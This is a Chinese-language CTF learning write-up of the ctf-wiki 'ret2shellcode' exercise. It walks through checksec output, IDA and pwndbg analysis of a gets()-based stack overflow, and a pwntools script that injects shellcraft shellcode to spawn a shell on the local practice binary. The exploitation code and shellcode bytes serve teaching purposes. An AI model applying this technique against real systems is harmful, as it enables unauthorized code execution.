# ret2shellcode

> 出自 https://github.com/ctf-wiki/ctf-wiki 中的Pwn: Linux Pwn: 栈溢出: 基本ROP
>
> writer: github.com/hex-16   data: 2021.3   contact: hexhex16@outlook.com
>
> file: ret2shellcode     (download from https://github.com/ctf-wiki/ctf-wiki)
>
> 原始出处未知，非比赛题目(也许)，故所在文件夹命名方式有所区别

- TBD: 无法获取稳定shell，疑似与bbs段没有可执行权限有关，vmmap显示的内容与ctf-wiki上展示的不同

# checksec

- 使用的是从 https://github.com/slimm609/checksec.sh 安装的新版`checksec`

```bash
$ checksec --file=ret2shellcode
RELRO          STACK CANARY     NX           PIE     RPATH     RUNPATH     Symbols      FORTIFY Fortified Fortifiable  FILE
Partial RELRO  No canary found  NX disabled  No PIE  No RPATH  No RUNPATH  79) Symbols    No    0         3            ret2shellcode
$ checksec --version
checksec v2.4.0, Brian Davis, github.com/slimm609/checksec.sh, Dec 2015
Based off checksec v1.5, Tobias Klein, www.trapkit.de, November 2011
```

- 注意没有canary，没有NX（no-execute disabled）即没有禁止执行保护

# IDA Analysis

- IDA显示的main函数：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[100]; // [esp+1Ch] [ebp-64h] BYREF

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("No system for you this time !!!");
  gets(s);
  strncpy(buf2, s, 0x64u);
  printf("bye bye ~");
  return 0;
}
```

- 代码中将输入的字符串`s`复制到了`buf2`中，`buf2`在内存的`.bbs`段，该段存储没有初始化的和初始化为0的全局变量。`.bbs`段相关知识查看https://github.com/hex-16/Markdown_Note/blob/master/%5BProgram%5D_C_Cpp_Python_php_Latex_DataBase/%5Bc%5D_Basis_DataType_Pointer_DataArea_Heap_Stack_BitOperation_bool.md
- IDA中显示的`buf2`存储的区域：

```c
.bss:0804A080                 public buf2
.bss:0804A080 ; char buf2[100]
.bss:0804A080 buf2            db 64h dup(?)           ; DATA XREF: main+7B↑o
.bss:0804A080 _bss            ends
```



# gdb(pwndbg) Analysis

- 已安装pwndbg

```bash
$ chmod 777 ./ret2shellcode
$ gdb -q ret2shellcode
pwndbg: loaded 188 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from ret2shellcode...
pwndbg> b main
Breakpoint 1 at 0x8048536: file ret2shellcode.c, line 8.
pwndbg> r
Starting program: /home/kali/CTF/pwn/ret2shellcode

Breakpoint 1, main () at ret2shellcode.c:8
8       ret2shellcode.c: No such file or directory.
......................
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 0x8048000  0x8049000 r-xp     1000 0      /home/kali/CTF/pwn/ret2shellcode
 0x8049000  0x804a000 r--p     1000 0      /home/kali/CTF/pwn/ret2shellcode
 0x804a000  0x804b000 rw-p     1000 1000   /home/kali/CTF/pwn/ret2shellcode
0xf7dca000 0xf7de7000 r--p    1d000 0      /usr/lib/i386-linux-gnu/libc-2.31.so
0xf7de7000 0xf7f3c000 r-xp   155000 1d000  /usr/lib/i386-linux-gnu/libc-2.31.so
0xf7f3c000 0xf7fac000 r--p    70000 172000 /usr/lib/i386-linux-gnu/libc-2.31.so
0xf7fac000 0xf7fad000 ---p     1000 1e2000 /usr/lib/i386-linux-gnu/libc-2.31.so
0xf7fad000 0xf7faf000 r--p     2000 1e2000 /usr/lib/i386-linux-gnu/libc-2.31.so
0xf7faf000 0xf7fb1000 rw-p     2000 1e4000 /usr/lib/i386-linux-gnu/libc-2.31.so
0xf7fb1000 0xf7fb3000 rw-p     2000 0
0xf7fcb000 0xf7fcd000 rw-p     2000 0
0xf7fcd000 0xf7fd1000 r--p     4000 0      [vvar]
0xf7fd1000 0xf7fd3000 r-xp     2000 0      [vdso]
0xf7fd3000 0xf7fd4000 r--p     1000 0      /usr/lib/i386-linux-gnu/ld-2.31.so
0xf7fd4000 0xf7ff1000 r-xp    1d000 1000   /usr/lib/i386-linux-gnu/ld-2.31.so
0xf7ff1000 0xf7ffc000 r--p     b000 1e000  /usr/lib/i386-linux-gnu/ld-2.31.so
0xf7ffc000 0xf7ffd000 r--p     1000 28000  /usr/lib/i386-linux-gnu/ld-2.31.so
0xf7ffd000 0xf7ffe000 rw-p     1000 29000  /usr/lib/i386-linux-gnu/ld-2.31.so
0xfffdd000 0xffffe000 rwxp    21000 0      [stack]
```

- 注意` 0x804a000  0x804b000 rw-p     1000 1000   /home/kali/CTF/pwn/ret2shellcode`这是`buf2`所在的区域
- 这里和ctf-wiki上显示的不一致，`0x804a000  0x804b000  rw-p`这一段并没有执行(`x`)权限





```c
$ gdb ./ret2shellcode -q
pwndbg: loaded 188 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from ./ret2shellcode...
pwndbg> b *0x080485AF
Breakpoint 1 at 0x80485af: file ret2shellcode.c, line 15.
pwndbg> r
Starting program: /home/kali/CTF/pwn/ret2shellcode
No system for you this time !!!
abcdabcd123456789

Breakpoint 1, 0x080485af in main () at ret2shellcode.c:15
15      ret2shellcode.c: No such file or directory.
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────
 EAX  0xffffd3bc ◂— 'abcdabcd123456789'
 EBX  0x0
 ECX  0xf7faf580 (_IO_2_1_stdin_) ◂— 0xfbad2288
 EDX  0xfbad2288
 EDI  0xf7faf000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e4d6c
 ESI  0xf7faf000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e4d6c
 EBP  0xffffd428 ◂— 0x0
 ESP  0xffffd3a0 —▸ 0x804a080 (buf2) ◂— 0x0
 EIP  0x80485af (main+130) —▸ 0xfffe6ce8 ◂— 0x0
────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────
 ► 0x80485af <main+130>    call   strncpy@plt <strncpy@plt>
        dest: 0x804a080 (buf2) ◂— 0x0
        src: 0xffffd3bc ◂— 'abcdabcd123456789'
        n: 0x64

   0x80485b4 <main+135>    mov    dword ptr [esp], 0x8048680
   0x80485bb <main+142>    call   printf@plt <printf@plt>

   0x80485c0 <main+147>    mov    eax, 0
   0x80485c5 <main+152>    leave
   0x80485c6 <main+153>    ret

   0x80485c7               nop             ..............
────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────
00:0000│ esp  0xffffd3a0 —▸ 0x804a080 (buf2) ◂— 0x0
01:0004│      0xffffd3a4 —▸ 0xffffd3bc ◂— 'abcdabcd123456789'
02:0008│      0xffffd3a8 ◂— 0x64 /* 'd' */
03:000c│      0xffffd3ac ◂— 0x0
04:0010│      0xffffd3b0 —▸ 0xf7ffd000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x29f3c
05:0014│      0xffffd3b4 —▸ 0xffffd43c —▸ 0xffffd464 ◂— 0x0
06:0018│      0xffffd3b8 ◂— 0x2
07:001c│ eax  0xffffd3bc ◂— 'abcdabcd123456789'
────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────
 ► f 0  80485af main+130
   f 1 f7de8e46 __libc_start_main+262
```

- s的地址：`0xffffd3bc`
- `ebp`栈帧基地址：`0xffffd428`,  s相对于`ebp`的偏移为 `0xffffd3bc - 0xffffd428` = `-0x6c`

# Exploit

- 获取的shell不稳定，疑似与前面显示的`0x804a000  0x804b000  rw-p`这一段没有执行(`x`)权限有关

```python
#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'

context.binary = './ret2shellcode'  # context(os='linux', arch='i386')
print(context)

sh = process('./ret2shellcode')
# shellcraft.i386.linux.sh()  #shellcraft.sh()
shellcode = asm(shellcraft.sh())  # type(shellcraft.sh()): str 为汇编代码
print("shellcode: ", type(shellcode), shellcode)
buf2_addr = 0x0804A080
payload = shellcode.ljust(0x6c + 4, b'A') + p32(buf2_addr)
sh.sendline(payload)
# b'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80AAAA...A\x80\xa0\x04\x08'
print("sendline: ", type(payload), len(payload), " : ", payload)
sh.interactive()
```





